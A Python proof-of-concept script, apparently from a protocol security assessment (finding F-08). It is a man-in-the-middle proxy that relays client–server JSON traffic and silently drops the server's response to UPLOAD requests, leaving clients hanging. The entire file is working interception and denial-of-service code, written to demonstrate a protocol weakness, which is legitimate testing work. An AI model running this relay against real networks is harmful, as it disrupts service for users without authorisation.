#!/usr/bin/env python3
"""
mitm_F08.py - Response Suppression (Denial of Service)
Finding: F-08
Violated: R2, R10
The MITM drops the server's response to UPLOAD requests. The client
sends the upload but never receives confirmation, hanging indefinitely.
Legitimate use is blocked without any server-side fault.
"""

import socket
import threading
import json

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

suppress_next_upload_response = [False]


def forward_c2s(client_sock, server_sock):
    buf = b""
    try:
        while True:
            chunk = client_sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    if obj.get("action") == "UPLOAD":
                        suppress_next_upload_response[0] = True
                        print(f"\n[F-08] UPLOAD request forwarded — will suppress server response\n")
                except Exception:
                    pass
                server_sock.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            server_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def forward_s2c(server_sock, client_sock):
    buf = b""
    try:
        while True:
            chunk = server_sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                if suppress_next_upload_response[0]:
                    suppress_next_upload_response[0] = False
                    print(f"[F-08 DROP] Server UPLOAD response suppressed. Client will hang.")
                    # Drop the line — do NOT forward to client
                    continue
                client_sock.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            client_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward_c2s, args=(client_sock, server_sock), daemon=True)
    t2 = threading.Thread(target=forward_s2c, args=(server_sock, client_sock), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-08] Response suppression active — UPLOAD responses will be dropped...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
